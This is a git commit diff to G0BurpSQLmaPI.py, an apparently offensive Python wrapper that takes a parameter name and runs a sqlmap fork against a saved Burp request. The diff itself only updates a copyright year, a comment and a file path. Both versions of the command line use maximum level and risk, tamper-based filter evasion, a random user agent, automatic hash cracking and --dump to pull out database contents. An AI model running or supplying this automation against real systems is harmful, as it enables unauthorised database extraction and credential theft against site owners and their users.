ce3dd0e7b4b23f078089096363c01e5081b9b6b5
nu11secur1ty <venvaropt@gmail.com>
2025-04-02 15:47:12 +0300

    Update G0BurpSQLmaPI.py

--- program/Framework-Advanced-Auto/G0BurpSQLmaPI.py
+++ program/Framework-Advanced-Auto/G0BurpSQLmaPI.py
@@ -1,5 +1,5 @@
 #!/usr/bin/python
-# nu11secur1ty 2023-2024
+# nu11secur1ty 2023-2025
 import time
 import os
 from colorama import init, Fore, Back, Style
@@ -17,10 +17,10 @@ print(Fore.RED)
 param_spec = input()
 print(Style.RESET_ALL)
 
-# Here you can modify your OWN injection construction!
+# Here, you can modify your OWN injection construction!
 # Your EXPLOIT ENVIRONMENT 
 env = 'Your_ENV_Path_here'
-os.system('python D:\\CVE\\sqlmap-nu11secur1ty\\sqlmap.py -r '+env+'exploit.txt -p '+param_spec+' --tamper=space2comment --dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump')
+os.system('python Y:\\Path_to_your_sqlmap-nu11secur1ty\\sqlmap-nu11secur1ty\\sqlmap.py -r '+env+'exploit.txt -p '+param_spec+' --tamper=space2comment --dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump')
 
 print(Fore.RED +"Happy hunting with nu11secur1ty =)")
 print(Style.RESET_ALL)
